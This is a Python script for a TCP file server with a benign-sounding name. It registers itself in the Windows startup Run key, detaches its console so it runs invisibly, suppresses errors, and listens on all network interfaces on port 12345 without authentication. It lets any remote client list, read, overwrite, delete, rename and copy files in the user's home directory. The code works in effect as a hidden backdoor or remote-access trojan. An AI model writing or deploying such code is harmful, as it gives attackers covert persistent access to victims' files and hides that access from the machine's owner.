import socketserver
import os
import json
import threading
import time
import sys
import shutil

def add_to_startup():
    """Add server to Windows startup registry."""
    if sys.platform != "win32":
        return
    
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        # Get the path to the current script
        script_path = os.path.abspath(sys.argv[0])
        # Use pythonw.exe to run without console window
        python_path = sys.executable
        # Replace python.exe with pythonw.exe if it exists
        pythonw_path = python_path.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw_path):
            pythonw_path = python_path
        command = f'"{pythonw_path}" "{script_path}"'
        winreg.SetValueEx(key, "NeverScamFileServer", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception as e:
        pass  # Silent fail - no print statements

def run_hidden():
    """Run server completely hidden."""
    # Suppress console output on Windows
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.FreeConsole()
    
    # Run server
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Keep alive silently
    while True:
        time.sleep(1)

class FileServerHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(1024).strip()
            if not data:
                return
            command = json.loads(data.decode('utf-8'))
            response = self.process_command(command)
            self.request.sendall(json.dumps(response).encode('utf-8'))
        except Exception as e:
            self.request.sendall(json.dumps({"error": str(e)}).encode('utf-8'))

    def process_command(self, command):
        cmd = command.get("cmd")
        path = command.get("path", "")
        # Sanitize path to prevent directory traversal
        path = os.path.abspath(path)
        if not path.startswith(os.path.expanduser("~")):
            return {"error": "Access denied"}

        if cmd == "LIST_DIR":
            try:
                items = os.listdir(path)
                return {"items": items}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "LIST_DIRS":
            try:
                items = [item for item in os.listdir(path) if os.path.isdir(os.path.join(path, item))]
                return {"items": items}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "READ_FILE":
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {"content": content}
            except UnicodeDecodeError:
                return {"error": "Binary file"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "WRITE_FILE":
            content = command.get("content", "")
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(content)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "DELETE":
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    os.rmdir(path)  # Only empty dirs
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "MKDIR":
            try:
                os.mkdir(path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "RENAME":
            new_path = command.get("new_path")
            new_path = os.path.abspath(new_path)
            if not new_path.startswith(os.path.expanduser("~")):
                return {"error": "Access denied"}
            try:
                os.rename(path, new_path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "COPY":
            dest = command.get("dest")
            dest = os.path.abspath(dest)
            if not dest.startswith(os.path.expanduser("~")):
                return {"error": "Access denied"}
            try:
                if os.path.isfile(path):
                    shutil.copy(path, dest)
                elif os.path.isdir(path):
                    shutil.copytree(path, dest)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "STAT":
            try:
                stat = os.stat(path)
                return {
                    "size": stat.st_size,
                    "mtime": stat.st_mtime
                }
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"error": "Unknown command"}

def run_server(host='0.0.0.0', port=12345):
    with socketserver.ThreadingTCPServer((host, port), FileServerHandler) as server:
        print(f"Server running on {host}:{port}")
        server.serve_forever()

if __name__ == "__main__":
    # Add to Windows startup and run hidden
    add_to_startup()
    run_hidden()
